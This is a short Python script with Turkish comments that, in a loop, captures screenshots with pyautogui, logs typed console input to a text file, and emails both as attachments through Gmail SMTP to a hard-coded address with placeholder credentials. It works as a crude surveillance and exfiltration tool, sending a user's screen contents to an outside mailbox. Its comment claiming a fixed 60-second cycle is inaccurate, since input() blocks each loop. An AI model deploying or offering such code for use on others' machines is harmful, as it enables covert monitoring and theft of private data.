import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time
import pyautogui
import zipfile

# Gmail hesap bilgileri yazılması lazım
GMAIL_USERNAME = "deneme@gmail.com"
GMAIL_PASSWORD = "erişim kodu"

# Alıcı e-posta adresi yazılması lazım
TO_EMAIL = "deneme@gmail.com"

# Ekran görüntüsünün kaydedileceği dosya yolu
SCREENSHOT_FILE = "screenshot.png"

# Verilerin kaydedileceği dosya yolu
DATA_FILE = "veriler.txt"

# 60 saniyede bir çalışacak döngü
while True:
    # Ekran görüntüsü al
    screenshot = pyautogui.screenshot()
    screenshot.save(SCREENSHOT_FILE)

    # Kullanıcıdan veri al
    veri = input()

    # Veriyi dosyaya kaydet
    with open(DATA_FILE, "a") as file:
        file.write(veri + "\n")

    # E-posta gönder
    msg = MIMEMultipart()
    msg['From'] = GMAIL_USERNAME
    msg['To'] = TO_EMAIL
    msg['Subject'] = "Yeni veri ve ekran görüntüsü"

    text = MIMEText("Yeni veri ve ekran görüntüsü ekte bulunmaktadır.")
    msg.attach(text)

    with open(SCREENSHOT_FILE, "rb") as file:
        screenshot_data = MIMEApplication(file.read(), Name="screenshot.png")
    screenshot_data['Content-Disposition'] = 'attachment; filename="screenshot.png"'
    msg.attach(screenshot_data)

    with open(DATA_FILE, "rb") as file:
        data = MIMEApplication(file.read(), Name="veriler.txt")
    data['Content-Disposition'] = 'attachment; filename="veriler.txt"'
    msg.attach(data)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(GMAIL_USERNAME, GMAIL_PASSWORD)
    server.sendmail(GMAIL_USERNAME, TO_EMAIL, msg.as_string())
    server.quit()

    print("Veri ve ekran görüntüsü gönderildi!")

    # 60 saniye bekle
    time.sleep(60)
